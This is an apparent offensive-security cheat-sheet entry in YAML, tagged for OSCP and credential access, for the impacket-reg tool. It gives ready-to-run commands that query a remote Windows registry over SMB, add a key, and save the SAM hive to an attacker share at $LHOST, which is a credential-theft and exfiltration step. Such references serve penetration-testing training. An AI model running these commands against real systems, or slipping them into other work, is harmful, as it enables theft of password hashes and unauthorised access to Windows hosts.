---
variants:
  - label: query
    command: |
      impacket-reg $DOMAIN/$USER:$PASSWORD@$IP query -keyName HKLM\SOFTWARE -s
  - label: save-hive
    command: |
      impacket-reg $DOMAIN/$USER:$PASSWORD@$IP save -keyName HKLM\SAM -o \\$LHOST\share\sam.save
  - label: add-key
    command: |
      impacket-reg $DOMAIN/$USER:$PASSWORD@$IP add -keyName HKLM\SOFTWARE\Test -v Flag -vt REG_SZ -vd value
description: Read and write the remote registry over SMB to query keys or dump SAM, SYSTEM, and SECURITY hives
os: [Linux]
category: [oscp, cli]
service: [RPC, SMB]
phase: [CredAccess, Enumeration]
references:
  - https://www.kali.org/tools/impacket-scripts/
  - https://github.com/fortra/impacket
---
